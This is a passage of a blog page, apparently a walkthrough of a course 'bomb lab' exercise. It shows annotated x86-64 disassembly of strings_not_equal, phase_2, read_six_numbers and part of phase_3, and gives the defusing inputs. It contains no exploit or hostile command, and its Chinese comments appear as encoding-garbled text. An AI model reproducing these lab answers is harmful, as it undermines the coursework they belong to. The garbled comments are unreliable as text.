class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-attribute">40133c</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> fb             mov    %rdi,%rbx #å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²çš„åœ°å€èµ‹ç»™rbxï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¸‹é¢string_lengthå‡½æ•°çš„å‚æ•°<br>  <span class="hljs-attribute">40133f</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f<span class="hljs-number">5</span>             mov    %rsi,%rbp #å°†ç­”æ¡ˆçš„å­—ç¬¦ä¸²çš„åœ°å€èµ‹ç»™rbpã€‚è¿™é‡Œèµ‹å€¼çš„ç›®çš„æ˜¯ä¸ºäº†ç»™ä¸‹é¢çš„å‡½æ•°è°ƒç”¨è…¾å‡ºå¯„å­˜å™¨<br>  <span class="hljs-attribute">401342</span>:e<span class="hljs-number">8</span> d<span class="hljs-number">4</span> ff ff ff       callq  <span class="hljs-number">40131</span>b &lt;string_length&gt;<br>  <span class="hljs-attribute">401347</span>:<span class="hljs-number">41</span> <span class="hljs-number">89</span> c<span class="hljs-number">4</span>             mov    %eax,%r<span class="hljs-number">12</span>d #å°†string_lengthå‡½æ•°çš„è¿”å›å€¼èµ‹ç»™r<span class="hljs-number">12</span>d<br>  <span class="hljs-attribute">40134a</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> ef             mov    %rbp,%rdi #æ¡¢æŒ‡é’ˆèµ‹ç»™rdiï¼Œä¹Ÿå³æ˜¯ç­”æ¡ˆçš„å­—ç¬¦ä¸²çš„æŒ‡é’ˆèµ‹ç»™rdiï¼Œè¿™é‡Œæ˜¯è®¡ç®—å‡ºç­”æ¡ˆçš„å­—ç¬¦ä¸²çš„é•¿åº¦<br>  <span class="hljs-attribute">40134d</span>:e<span class="hljs-number">8</span> c<span class="hljs-number">9</span> ff ff ff       callq  <span class="hljs-number">40131</span>b &lt;string_length&gt;<br>  <span class="hljs-attribute">401352</span>:ba <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%edx<br>  <span class="hljs-attribute">401357</span>:<span class="hljs-number">41</span> <span class="hljs-number">39</span> c<span class="hljs-number">4</span>             cmp    %eax,%r<span class="hljs-number">12</span>d#å°†ç­”æ¡ˆçš„å­—ç¬¦ä¸²çš„é•¿åº¦ä¸æˆ‘ä»¬çš„è¾“å…¥çš„å­—ç¬¦ä¸²çš„é•¿åº¦è¿›è¡Œæ¯”è¾ƒ<br>  <span class="hljs-attribute">40135a</span>:<span class="hljs-number">75</span> <span class="hljs-number">3</span>f                jne    <span class="hljs-number">40139</span>b &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">63</span>&gt;<br>  <span class="hljs-attribute">40135c</span>:<span class="hljs-number">0</span>f b<span class="hljs-number">6</span> <span class="hljs-number">03</span>             movzbl (%rbx),%eax #å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²çš„åœ°å€èµ‹ç»™eax<br>  <span class="hljs-attribute">40135f</span>:<span class="hljs-number">84</span> c<span class="hljs-number">0</span>                test   %al,%al#æ£€æµ‹alçš„å€¼æ˜¯ä¸æ˜¯<span class="hljs-number">0</span><br>  <span class="hljs-attribute">401361</span>:<span class="hljs-number">74</span> <span class="hljs-number">25</span>                je     <span class="hljs-number">401388</span> &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">50</span>&gt;#æ˜¯<span class="hljs-number">0</span>å°±è·³åˆ°<span class="hljs-number">401388</span><br>  <span class="hljs-attribute">401363</span>:<span class="hljs-number">3</span>a <span class="hljs-number">45</span> <span class="hljs-number">00</span>             cmp    <span class="hljs-number">0</span>x<span class="hljs-number">0</span>(%rbp),%al#å°†ç­”æ¡ˆå­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸alè¿›è¡Œæ¯”å¯¹<br>  <span class="hljs-attribute">401366</span>:<span class="hljs-number">74</span> <span class="hljs-number">0</span>a                je     <span class="hljs-number">401372</span> &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">3</span>a&gt;#å¦‚æœç›¸ç­‰å°±è·³åˆ°<span class="hljs-number">401372</span><br>  <span class="hljs-attribute">401368</span>:eb <span class="hljs-number">25</span>                jmp    <span class="hljs-number">40138</span>f &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">57</span>&gt;<br>  <span class="hljs-attribute">40136a</span>:<span class="hljs-number">3</span>a <span class="hljs-number">45</span> <span class="hljs-number">00</span>             cmp    <span class="hljs-number">0</span>x<span class="hljs-number">0</span>(%rbp),%al<br>  <span class="hljs-attribute">40136d</span>:<span class="hljs-number">0</span>f <span class="hljs-number">1</span>f <span class="hljs-number">00</span>             nopl   (%rax)<br>  <span class="hljs-attribute">401370</span>:<span class="hljs-number">75</span> <span class="hljs-number">24</span>                jne    <span class="hljs-number">401396</span> &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">5</span>e&gt;<br>  <span class="hljs-attribute">401372</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">3</span> <span class="hljs-number">01</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%rbx#rbxåŠ åˆ°ä¸‹ä¸€ä¸ªå­—èŠ‚<br>  <span class="hljs-attribute">401376</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">5</span> <span class="hljs-number">01</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%rbp#rbpåŠ åˆ°ä¸‹ä¸€ä¸ªå­—èŠ‚<br>  <span class="hljs-attribute">40137a</span>:<span class="hljs-number">0</span>f b<span class="hljs-number">6</span> <span class="hljs-number">03</span>             movzbl (%rbx),%eax#æŠŠrbxå¯¹åº”å†…å­˜çš„å€¼èµ‹ç»™eax<br>  <span class="hljs-attribute">40137d</span>:<span class="hljs-number">84</span> c<span class="hljs-number">0</span>                test   %al,%al#çœ‹alæ˜¯ä¸æ˜¯<span class="hljs-number">0</span>ï¼Œ<span class="hljs-number">0</span>è¯´æ˜åˆ°äº†å­—ç¬¦ä¸²æœ«å°¾å¤„<br>  <span class="hljs-attribute">40137f</span>:<span class="hljs-number">75</span> e<span class="hljs-number">9</span>                jne    <span class="hljs-number">40136</span>a &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">32</span>&gt;<br>  <span class="hljs-attribute">401381</span>:ba <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%edx<br>  <span class="hljs-attribute">401386</span>:eb <span class="hljs-number">13</span>                jmp    <span class="hljs-number">40139</span>b &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">63</span>&gt;<br>  <span class="hljs-attribute">401388</span>:ba <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%edx<br>  <span class="hljs-attribute">40138d</span>:eb <span class="hljs-number">0</span>c                jmp    <span class="hljs-number">40139</span>b &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">63</span>&gt;<br>  <span class="hljs-attribute">40138f</span>:ba <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%edx<br>  <span class="hljs-attribute">401394</span>:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">40139</span>b &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">63</span>&gt;<br>  <span class="hljs-attribute">401396</span>:ba <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%edx<br>  <span class="hljs-attribute">40139b</span>:<span class="hljs-number">89</span> d<span class="hljs-number">0</span>                mov    %edx,%eax #ä¿å­˜è¿”å›å€¼<br>  <span class="hljs-attribute">40139d</span>:<span class="hljs-number">5</span>b                   pop    %rbx<br>  <span class="hljs-attribute">40139e</span>:<span class="hljs-number">5</span>d                   pop    %rbp<br>  <span class="hljs-attribute">40139f</span>:<span class="hljs-number">41</span> <span class="hljs-number">5</span>c                pop    %r<span class="hljs-number">12</span><br>  <span class="hljs-attribute">4013a1</span>:c<span class="hljs-number">3</span>                   retq   <br></code></pre></td></tr></table></figure></li></ul><h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><ul><li>read_six_numbers(input_string,rsp)<ul><li>ç¬¬ä¸€ä¸ªå‚æ•°ç”±rdiä¿å­˜ï¼Œä¹Ÿå³æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²çš„åœ°å€</li><li>ç¬¬äºŒä¸ªå‚æ•°æ˜¯rsiä¿å­˜ï¼Œä¹Ÿå³æ˜¯rspçš„åœ°å€ï¼Œæœ¬è´¨ä¸Šstrings_not_equalå‡½æ•°æ˜¯æŠŠå­—ç¬¦ä¸²ä¸­çš„æ•°å­—å­˜åˆ°äº†rspä¸Š</li><li>è°ƒç”¨äº†sscanfå‡½æ•°</li></ul></li><li>è¯»å–äº†å…­ä¸ªæ•°å­—ä¹‹åéœ€è¦å’Œæ­£ç¡®ç­”æ¡ˆæ¯”å¯¹ï¼Œè¿™é‡Œä½¿ç”¨äº†å¾ªç¯è¿›è¡Œæµç¨‹æ§åˆ¶<ul><li>æ¯”å¦‚ç¬¬ä¸€ä¸ªæ•°å­—å¿…é¡»æ˜¯1ï¼Œç„¶ååé¢çš„æ•°å­—å¯ä»¥é™†ç»­æ¨å¯¼å¾—å‡º</li></ul></li><li><code>1 2 4 8 16 32 </code></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000400efc</span> &lt;phase_<span class="hljs-number">2</span>&gt;:<br>  <span class="hljs-attribute">400efc</span>:<span class="hljs-number">55</span>                   push   %rbp<br>  <span class="hljs-attribute">400efd</span>:<span class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-attribute">400efe</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">28</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">28</span>,%rsp    #<span class="hljs-number">0</span>x<span class="hljs-number">28</span>=<span class="hljs-number">40</span>  åä¸ªintç±»å‹æ•°<br>  <span class="hljs-attribute">400f02</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> e<span class="hljs-number">6</span>             mov    %rsp,%rsi  <br>  <span class="hljs-attribute">400f05</span>:e<span class="hljs-number">8</span> <span class="hljs-number">52</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40145</span>c &lt;read_six_numbers&gt;#è¯»å–å…­ä¸ªæ•°å­—ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ï¼šrdi  ç¬¬äºŒä¸ªï¼šrsp<br>  <span class="hljs-attribute">400f0a</span>:<span class="hljs-number">83</span> <span class="hljs-number">3</span>c <span class="hljs-number">24</span> <span class="hljs-number">01</span>          cmpl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%rsp)#æ¯”è¾ƒ<span class="hljs-number">1</span>å’Œrspå¯¹åº”å†…å­˜çš„å€¼ï¼Œå¦‚æœä¸ç›¸åŒå°±çˆ†ç‚¸(ç¬¬ä¸€ä¸ªæ•°å­—å¿…é¡»æ˜¯<span class="hljs-number">1</span>)<br>  <span class="hljs-attribute">400f0e</span>:<span class="hljs-number">74</span> <span class="hljs-number">20</span>                je     <span class="hljs-number">400</span>f<span class="hljs-number">30</span> &lt;phase_<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x<span class="hljs-number">34</span>&gt;<br>  <span class="hljs-attribute">400f10</span>:e<span class="hljs-number">8</span> <span class="hljs-number">25</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400f15</span>:eb <span class="hljs-number">19</span>                jmp    <span class="hljs-number">400</span>f<span class="hljs-number">30</span> &lt;phase_<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x<span class="hljs-number">34</span>&gt;<br>  <span class="hljs-attribute">400f17</span>:<span class="hljs-number">8</span>b <span class="hljs-number">43</span> fc             mov    -<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%rbx),%eax  #æŠŠrbx-<span class="hljs-number">4</span>åœ°å€çš„å€¼ä¹Ÿå³æ˜¯ç¬¬<span class="hljs-number">1</span>ä¸ªè¾“å…¥çš„æ•°å­—èµ‹ç»™eaxï¼Œeax=<span class="hljs-number">1</span><br>  <span class="hljs-attribute">400f1a</span>:<span class="hljs-number">01</span> c<span class="hljs-number">0</span>                add    %eax,%eax #eax=<span class="hljs-number">2</span><br>  <span class="hljs-attribute">400f1c</span>:<span class="hljs-number">39</span> <span class="hljs-number">03</span>                cmp    %eax,(%rbx) #å’ŒrbxæŒ‡å‘çš„å†…å®¹è¿›è¡Œå¯¹æ¯”å¦‚æœä¸ç›¸åŒå°±çˆ†ç‚¸ï¼Œå› æ­¤rbxæŒ‡å‘å†…å®¹å¿…é¡»ä¸º<span class="hljs-number">2</span><br>  <span class="hljs-attribute">400f1e</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400</span>f<span class="hljs-number">25</span> &lt;phase_<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x<span class="hljs-number">29</span>&gt;<br>  <span class="hljs-attribute">400f20</span>:e<span class="hljs-number">8</span> <span class="hljs-number">15</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400f25</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">3</span> <span class="hljs-number">04</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">4</span>,%rbx #rbx+<span class="hljs-number">4</span>ï¼Œç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªintæ•°å­—çš„åœ°å€<br>  <span class="hljs-attribute">400f29</span>:<span class="hljs-number">48</span> <span class="hljs-number">39</span> eb             cmp    %rbp,%rbx #å’Œrbxå¯¹æ¯”ï¼Œçœ‹æ˜¯ä¸æ˜¯åˆ°è¾¾äº†ç¬¬å…­ä¸ªæ•°å­—<br>  <span class="hljs-attribute">400f2c</span>:<span class="hljs-number">75</span> e<span class="hljs-number">9</span>                jne    <span class="hljs-number">400</span>f<span class="hljs-number">17</span> &lt;phase_<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x<span class="hljs-number">1</span>b&gt;<br>  <span class="hljs-attribute">400f2e</span>:eb <span class="hljs-number">0</span>c                jmp    <span class="hljs-number">400</span>f<span class="hljs-number">3</span>c &lt;phase_<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x<span class="hljs-number">40</span>&gt;<br>  <span class="hljs-attribute">400f30</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">04</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%rsp),%rbx #æŠŠç¬¬äºŒä¸ªæ•°å­—çš„åœ°å€èµ‹ç»™rbx<br>  <span class="hljs-attribute">400f35</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">6</span>c <span class="hljs-number">24</span> <span class="hljs-number">18</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">18</span>(%rsp),%rbp #rbpæ˜¯æœ€åä¸€ä¸ªæ•°å­—çš„åœ°å€ <span class="hljs-number">0</span>x<span class="hljs-number">18</span>=<span class="hljs-number">16</span>+<span class="hljs-number">8</span>=<span class="hljs-number">24</span> <span class="hljs-number">24</span>/<span class="hljs-number">4</span>=<span class="hljs-number">6</span><br>  <span class="hljs-attribute">400f3a</span>:eb db                jmp    <span class="hljs-number">400</span>f<span class="hljs-number">17</span> &lt;phase_<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x<span class="hljs-number">1</span>b&gt;<br>  <span class="hljs-attribute">400f3c</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">28</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">28</span>,%rsp<br>  <span class="hljs-attribute">400f40</span>:<span class="hljs-number">5</span>b                   pop    %rbx<br>  <span class="hljs-attribute">400f41</span>:<span class="hljs-number">5</span>d                   pop    %rbp<br>  <span class="hljs-attribute">400f42</span>:c<span class="hljs-number">3</span>                   retq   <br></code></pre></td></tr></table></figure><p>å…³äºsscanfå‡½æ•°çš„å…·ä½“å®ç°ï¼š</p><p>å…³äºsscanfå‡½æ•°çš„ç”¨æ³•å¯ä»¥åœ¨<a href="https://cplusplus.com/reference/cstdio/sscanf/">C++ reference</a>ä¸Šæ‰¾åˆ°ï¼Œç†è§£è¯¥å‡½æ•°çš„è°ƒç”¨å’Œä¼ å‚å¯ä»¥å¸®åŠ©ç†è§£æ±‡ç¼–ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* sscanf example */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> sentence []=<span class="hljs-string">&quot;Rudolph is 12 years old&quot;</span>;<br>  <span class="hljs-keyword">char</span> str [<span class="hljs-number">20</span>];<br>  <span class="hljs-keyword">int</span> i;<br><span class="hljs-comment">//è¿™é‡Œæœ‰å››ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯sentenceï¼šå­—ç¬¦ä¸²çš„åœ°å€ï¼›&quot;%s %*s %d&quot;å­—ç¬¦ä¸²ï¼Œstrï¼Œ&amp;i</span><br>  <span class="hljs-built_in">sscanf</span> (sentence,<span class="hljs-string">&quot;%s %*s %d&quot;</span>,str,&amp;i);<br>  <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;%s -&gt; %d\n&quot;</span>,str,i);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">000000000040145c</span> &lt;read_six_numbers&gt;: # å‚æ•°ï¼šrdiï¼ˆè¾“å…¥çš„æ•°å­—å­—ç¬¦ä¸²ï¼‰ rsiï¼ˆï¼‰ rdx rcx r<span class="hljs-number">8</span> r<span class="hljs-number">9</span><br>  <span class="hljs-attribute">40145c</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp #<span class="hljs-number">0</span>x<span class="hljs-number">18</span>==<span class="hljs-number">24</span>byteï¼Œä¹Ÿå³æ˜¯å…­ä¸ªintç±»å‹çš„æ•°å­—<br>  <span class="hljs-attribute">401460</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f<span class="hljs-number">2</span>             mov    %rsi,%rdx # rsiæ˜¯ç¬¬ä¸€ä¸ªæ•°å­—çš„åœ°å€ï¼Œèµ‹ç»™rdx<br>  <span class="hljs-attribute">401463</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>e <span class="hljs-number">04</span>          lea    <span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%rsi),%rcx #rcxæ˜¯ç¬¬äºŒä¸ªæ•°å­—çš„åœ°å€ <br>  <span class="hljs-attribute">401467</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">14</span>          lea    <span class="hljs-number">0</span>x<span class="hljs-number">14</span>(%rsi),%rax # raxæ˜¯ç¬¬<span class="hljs-number">5</span>ä¸ªæ•°å­—çš„åœ°å€<br>  <span class="hljs-attribute">40146b</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       mov    %rax,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp) # rax<br>  <span class="hljs-attribute">401470</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">10</span>          lea    <span class="hljs-number">0</span>x<span class="hljs-number">10</span>(%rsi),%rax<br>  <span class="hljs-attribute">401474</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>          mov    %rax,(%rsp)<br>  <span class="hljs-attribute">401478</span>:<span class="hljs-number">4</span>c <span class="hljs-number">8</span>d <span class="hljs-number">4</span>e <span class="hljs-number">0</span>c          lea    <span class="hljs-number">0</span>xc(%rsi),%r<span class="hljs-number">9</span><br>  <span class="hljs-attribute">40147c</span>:<span class="hljs-number">4</span>c <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">08</span>          lea    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsi),%r<span class="hljs-number">8</span><br>  <span class="hljs-attribute">401480</span>:be c<span class="hljs-number">3</span> <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">4025</span>c<span class="hljs-number">3</span>,%esi<br>  <span class="hljs-attribute">401485</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">40148a</span>:e<span class="hljs-number">8</span> <span class="hljs-number">61</span> f<span class="hljs-number">7</span> ff ff       callq  <span class="hljs-number">400</span>bf<span class="hljs-number">0</span> &lt;__isoc<span class="hljs-number">99</span>_sscanf@plt&gt;<br>  <span class="hljs-attribute">40148f</span>:<span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">05</span>             cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">5</span>,%eax<br>  <span class="hljs-attribute">401492</span>:<span class="hljs-number">7</span>f <span class="hljs-number">05</span>                jg     <span class="hljs-number">401499</span> &lt;read_six_numbers+<span class="hljs-number">0</span>x<span class="hljs-number">3</span>d&gt;<br>  <span class="hljs-attribute">401494</span>:e<span class="hljs-number">8</span> a<span class="hljs-number">1</span> ff ff ff       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">401499</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">18</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">40149d</span>:c<span class="hljs-number">3</span>                   retq   <br></code></pre></td></tr></table></figure><h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><ul><li>åˆšè¿›å…¥phase_3è¿™ä¸ªå‡½æ•°å°±è°ƒç”¨äº†sscanfå‡½æ•°ï¼Œå› æ­¤éœ€è¦å‡†å¤‡å‚æ•°<ul><li>sscanf(input_string,â€%d %dâ€,rdx,rcx)</li><li>sscanfå‡½æ•°è¿”å›è¯»å–çš„æ•°å­—çš„æ•°é‡ï¼Œå¦‚æœä¸æ˜¯å¤§äºç­‰äº2ä¼šçˆ†ç‚¸</li></ul></li><li>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—å’Œ7è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœå¤§äºå°±çˆ†ç‚¸ï¼Œå› æ­¤åªèƒ½å¤§äºç­‰äº0å°äºç­‰äº7</li><li>é‡ç‚¹æ˜¯jmpq   *0x402470(,%rax,8)è¯­å¥ï¼Œè¿™é‡Œå¯ä»¥æŸ¥çœ‹*0x402470çš„å€¼ä»è€Œç¡®å®šè¦è·³è½¬çš„åœ°æ–¹</li><li>å¦‚æœè¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯0ï¼Œé‚£ä¹ˆå°±ä¼šè·³è½¬åˆ°ä¸‹é¢çš„ç¬¬ä¸€ä¸ªåˆ†æ”¯è¯­å¥ï¼Œä»è€Œç¡®å®šç¬¬äºŒä¸ªå€¼</li><li>è¿™é‡Œæœ‰å¾ˆå¤šä¸ªç­”æ¡ˆï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯<code>0 207</code><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000400f43</span> &lt;phase_<span class="hljs-number">3</span>&gt;:# å‚æ•°é¡ºåºï¼šrdiï¼ˆè¾“å…¥çš„æ•°å­—å­—ç¬¦ä¸²ï¼‰ rsiï¼ˆï¼‰ rdx rcx r<span class="hljs-number">8</span> r<span class="hljs-number">9</span> <br>  <span class="hljs-attribute">400f43</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">400f47</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0</span>xc(%rsp),%rcx #ç¬¬å››ä¸ªå‚æ•°<br>  <span class="hljs-attribute">400f4c</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%rdx #ç¬¬ä¸‰ä¸ªå‚æ•°<br>  <span class="hljs-attribute">400f51</span>:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">4025</span>cf,%esi #gdbæŸ¥çœ‹å‘ç°æ˜¯ â€œ%d %dâ€ï¼Œç¬¬äºŒä¸ªå‚æ•°<br>  <span class="hljs-attribute">400f56</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">400f5b</span>:e<span class="hljs-number">8</span> <span class="hljs-number">90</span> fc ff ff       callq  <span class="hljs-number">400</span>bf<span class="hljs-number">0</span> &lt;__isoc<span class="hljs-number">99</span>_sscanf@plt&gt;<br>  <span class="hljs-attribute">400f60</span>:<span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">01</span>             cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%eax<br>  <span 